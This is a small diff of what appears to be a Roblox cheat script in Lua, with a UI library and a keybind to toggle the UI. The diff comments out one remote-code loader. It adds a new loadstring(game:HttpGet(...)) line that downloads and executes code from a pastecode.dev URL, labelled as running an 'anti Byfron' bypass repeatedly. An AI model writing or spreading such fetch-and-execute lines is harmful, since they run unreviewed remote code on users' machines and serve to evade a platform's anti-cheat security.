@@ -4381,7 +4381,9 @@ MoreSection:NewKeybind("Toggle ui", "toggle the ui yes", Enum.KeyCode.Insert, fu
 Library:ToggleUI()
 end)
 --sumthing
-loadstring(game:HttpGet("https://raw.githubusercontent.com/rrixh/uNb6892M/main/pastebin.com.uNb6892M",true))();
+--loadstring(game:HttpGet("https://raw.githubusercontent.com/rrixh/uNb6892M/main/pastebin.com.uNb6892M",true))();
+--EXEKUTES ANTI BYFRON REPEATEDLY
+loadstring(game:HttpGet("https://pastecode.dev/raw/47jlem7o/antibyfron-exekutes80906634Times.deb",true))()
 
 
 
